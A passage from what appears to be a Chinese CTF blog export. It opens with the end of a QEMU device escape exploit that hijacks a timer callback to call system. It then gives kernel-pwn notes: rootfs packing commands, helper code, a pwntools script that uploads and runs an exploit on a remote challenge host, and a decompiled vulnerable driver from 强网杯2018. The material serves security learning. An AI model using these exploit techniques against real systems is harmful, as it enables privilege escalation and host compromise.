(mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = read_val(<span class="number">-192</span>) - <span class="number">0xf581e0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf_addr = read_val(<span class="number">-184</span>) + <span class="number">0xB40</span>;</span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">    <span class="type">size_t</span> main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;  </span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;buf_addr&quot;</span>, buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;main_loop_tlg&quot;</span>, main_loop_tlg);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = read_val(main_loop_tlg + <span class="number">8</span> - buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;timer_list_addr&quot;</span>, timer_list_addr);</span><br><span class="line"></span><br><span class="line">    write_val(<span class="number">8</span>, buf_addr);  <span class="comment">// QEMUTimerList *timer_list</span></span><br><span class="line">    write_val(<span class="number">0x10</span>, system_plt);  <span class="comment">// QEMUTimerCB *cb</span></span><br><span class="line">    write_val(<span class="number">0x18</span>, buf_addr + <span class="number">0x30</span>);  <span class="comment">// void *opaque</span></span><br><span class="line">    write_val(<span class="number">0x30</span>,<span class="number">0x67616c6620746163</span>);  <span class="comment">// cat flag</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x10</span>, timer_list_addr + <span class="number">0x40</span> - buf_addr);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, buf_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel</title>
      <link href="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>主要记录一些入门级别的<code>kernel pwn</code>和一些平时做题要经常用到的命令</p><h1 id="做题技巧"><a href="#做题技巧" class="headerlink" title="做题技巧"></a>做题技巧</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="利用musl静态编译exp"><a href="#利用musl静态编译exp" class="headerlink" title="利用musl静态编译exp"></a>利用musl静态编译exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc -static -masm=intel -pthread exp.c -o exp</span><br></pre></td></tr></table></figure><h3 id="查找ko文件的基址"><a href="#查找ko文件的基址" class="headerlink" title="查找ko文件的基址"></a>查找ko文件的基址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proc/modules</span><br></pre></td></tr></table></figure><h3 id="编译exp并将其打包进题目中"><a href="#编译exp并将其打包进题目中" class="headerlink" title="编译exp并将其打包进题目中"></a>编译exp并将其打包进题目中</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure><h3 id="从bzImage中提取vmlinux"><a href="#从bzImage中提取vmlinux" class="headerlink" title="从bzImage中提取vmlinux"></a>从bzImage中提取vmlinux</h3><h4 id="extract-linux（脚本源码）"><a href="#extract-linux（脚本源码）" class="headerlink" title="extract_linux（脚本源码）"></a>extract_linux（脚本源码）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use readelf to check <span class="keyword">if</span> it<span class="string">&#x27;s a valid ELF</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      and not just an elf</span></span><br><span class="line">readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">cat $1</span><br><span class="line">exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The obscure use of the <span class="string">&quot;tr&quot;</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">forpos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">do</span><br><span class="line">pos=$&#123;pos%%:*&#125;</span><br><span class="line">tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">check_vmlinux $tmp</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract_linux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><h3 id="常用辅助脚本"><a href="#常用辅助脚本" class="headerlink" title="常用辅助脚本"></a>常用辅助脚本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="远程脚本"><a href="#远程脚本" class="headerlink" title="远程脚本"></a>远程脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28115</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;$ &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    send_cmd(<span class="string">&#x27;cd /proc/141/net&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># os.system(&#x27;musl-gcc -w -s -static -o3 exp.c -o exp&#x27;)</span></span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="init文件"><a href="#init文件" class="headerlink" title="init文件"></a>init文件</h3><p>可以加上下面两行，第一行是因为内核中的打印都是用<code>printk</code>的，需要用<code>dmesg</code>看日志，加上这一行才能不需要<code>root</code>运行<code>dmesg</code>；第二行是把那个自定义模块的基址打印到另一个文件中，调试要用。不过把原先的<code>init</code>文件中的<code>echo 1</code>的那两句删掉应该也是同样效果的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">cat /sys/module/core/sections/.text &gt; /tmp/core_text</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>通常<code>start.sh</code> 文件里会存在一行为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s \</span><br></pre></td></tr></table></figure><p>这个<code>-s</code>为<code>-gdb tcp::1234</code>的缩写,表示监听<code>1234</code>端口,在<code>gdb</code>中可以通过<code>target remote localhost:1234</code>连接<br>首先我们要通过<code>./start.sh</code>来启动内核，然后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">add-symbol-file core.ko `这里写那个core_text文件中泄漏出来的基址`</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote:1234</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *(core_copy_func+104)</span></span><br></pre></td></tr></table></figure><p>第一句就是根据基址加载模块的符号，第二句是远程调试进入虚拟机，第三句就可以愉快地用符号下断点了</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 core"></a>强网杯2018 core</h2><p>找了半天总算找到一题相对简单<code>kernel pwn</code>了</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>我们主要看的是<code>core.ko</code>这一个文件，这是出题人写的内核驱动模块，通常漏洞都是在这里。做题所需要的函数和<code>gadget</code>可以在<code>vmlinux</code>中找</p><h4 id="core-ioctl"><a href="#core-ioctl" class="headerlink" title="core_ioctl"></a>core_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( (_DWORD)a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3, a2);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE, <span class="number">438LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-write"><a href="#core-write" class="headerlink" title="core_write"></a>core_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B, a2);</span><br><span class="line">  printk(&amp;unk_275, off);</span><br><span class="line">  v3 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v6[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v3[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v3, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见<code>ictol</code>函数是用户与内核进行交互的函数，功能有：</p><ul><li>调用<code>core_read</code>函数</li><li>设置<code>off</code>参数的值</li><li>调用<code>core_copy_func</code>函数</li></ul><p>可以看到<code>core_read</code>函数中调用了<code>copy_to_user(a1, 